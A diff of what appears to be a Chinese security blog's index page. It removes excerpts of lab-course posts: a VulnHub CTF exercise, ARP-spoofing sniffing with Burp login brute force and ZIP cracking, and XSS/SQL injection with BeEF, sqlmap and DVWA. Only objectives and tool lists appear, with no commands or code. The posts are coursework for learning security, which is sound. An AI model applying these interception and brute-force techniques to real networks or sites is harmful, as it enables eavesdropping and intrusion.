+<p><strong>准备工作：</strong><br>1.收集目标服务器各类信息<br>2.部署相关分析软件及平台等<br>3.整理相关安全渗透工具指纹库<br>4.针对异常表现第一时间触发思路<br>从表现预估入侵面及权限面进行排查**</p>
             
         </div>
     </div>
@@ -553,110 +502,6 @@ https://github.com/diogo-fernan/ir-rescue
         
     </div>
     <a href="/2024/05/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E5%9B%9B%20CTF%E5%AE%9E%E8%B7%B5/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/5
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="实验四-CTF实践"><a href="#实验四-CTF实践" class="headerlink" title="实验四 CTF实践"></a>实验四 CTF实践</h1><h2 id="1-实验目的和要求"><a href="#1-实验目的和要求" class="headerlink" title="1. 实验目的和要求"></a>1. 实验目的和要求</h2><p>实验目的：通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。</p>
-<p>系统环境：Kali Linux 2、WebDeveloper靶机来源：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> </p>
-<p>实验工具：不限</p>
-<p><strong></strong></p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E5%9B%9B%20CTF%E5%AE%9E%E8%B7%B5/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/5
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="实验二-网络嗅探与身份认证"><a href="#实验二-网络嗅探与身份认证" class="headerlink" title="实验二 网络嗅探与身份认证"></a><strong>实验二 网络嗅探与身份认证</strong></h1><h2 id="1-实验目的和要求"><a href="#1-实验目的和要求" class="headerlink" title="1. 实验目的和要求"></a>1. 实验目的和要求</h2><p>1、通过使用Wireshark软件掌握Sniffer（嗅探器）工具的使用方法，实现捕捉HTTP等协议的数据包，以理解TCP/IP协议中多种协议的数据结构、通过实验了解HTTP等协议明文传输的特性。</p>
-<p>2、研究交换环境下的网络嗅探实现及防范方法，研究并利用ARP协议的安全漏洞，通过Arpspoof实现ARP欺骗以捕获内网其他用户数据。</p>
-<p>3、能利用BrupSuite实现网站登录暴力破解获得登录密码。</p>
-<p>4、能实现ZIP密码破解，理解安全密码的概念和设置。</p>
-<p>系统环境：Kali Linux 2、Windows</p>
-<p>网络环境：交换网络结构</p>
-<p>实验工具：Arpspoof、WireShark、BurpSuite、fcrackzip（用于zip密码破解）。</p>
-<p><strong></strong></p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E4%B8%89%20XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/5
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="实验三-XSS和SQL注入"><a href="#实验三-XSS和SQL注入" class="headerlink" title="实验三 XSS和SQL注入"></a><strong>实验三 XSS和SQL注入</strong></h1><h2 id="1-实验目的和要求"><a href="#1-实验目的和要求" class="headerlink" title="1. 实验目的和要求"></a>1. 实验目的和要求</h2><p>实验目的：了解什么是XSS；了解XSS攻击实施，理解防御XSS攻击的方法；了解SQL注入的基本原理；掌握PHP脚本访问MySQL数据库的基本方法；掌握程序设计中避免出现SQL注入漏洞的基本方法；掌握网站配置。</p>
-<p>系统环境：Kali Linux 2、Windows Server</p>
-<p>网络环境：交换网络结构</p>
-<p>实验工具： Beef；AWVS(Acunetix Web Vulnarability Scanner);SqlMAP；DVWA</p>
-<p><strong></strong></p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/05/%E5%AE%9E%E9%AA%8C%E4%B8%89%20XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -669,6 +514,9 @@ https://github.com/diogo-fernan/ir-rescue
     
     <a class="page-num" href="/page/3">3</a>
     
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/4">4</a>
     
     
     <a class="page-num" href="/page/2/">
